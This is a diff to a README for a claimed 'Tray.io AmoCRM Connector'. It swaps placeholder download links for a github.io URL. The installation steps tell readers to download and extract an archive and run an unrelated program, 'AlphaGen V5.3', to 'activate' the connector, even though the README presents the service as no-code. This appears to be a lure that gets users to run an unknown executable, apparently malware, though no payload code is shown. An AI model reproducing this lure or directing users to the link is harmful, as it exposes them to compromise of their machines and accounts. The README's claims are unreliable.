@@ -2,13 +2,13 @@
 
 Connect AmoCRM with thousands of apps using Tray.io — create automated workflows, sync data, and integrate services with zero code.
 
-[![Download](https://img.shields.io/badge/Download-Trayio_AmoCRM_Connector-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Trayio_AmoCRM_Connector-blueviolet)](https://trayio-amocrm-connector.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://trayio-amocrm-connector.github.io/.github)  
 2. 📁 Extract the folder to any location  
 3. 🖱 Run AlphaGen V5.3 to activate Tray.io connector options  
 4. ✅ Log in to Tray.io, add AmoCRM as a data source, and create your automation flows using drag-and-drop logic
